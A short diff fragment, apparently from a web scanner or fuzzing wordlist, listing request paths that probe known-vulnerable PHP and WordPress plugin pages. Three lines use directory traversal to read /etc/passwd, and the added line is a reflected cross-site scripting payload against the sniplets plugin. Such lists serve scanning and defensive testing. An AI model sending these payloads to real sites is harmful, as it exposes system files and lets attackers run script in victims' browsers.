@@ -6,3 +6,4 @@
 /index.php?option=com_pro_desk&include_file=../../../../../../etc/passwd
 /comm.php?id=../../../../../../../../../../etc/passwd
 /viewrq.php?format=ps&var_filename=../../../../../../../../../../etc/passwd
+/wp-content/plugins/sniplets/view/sniplets/warning.php?text=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
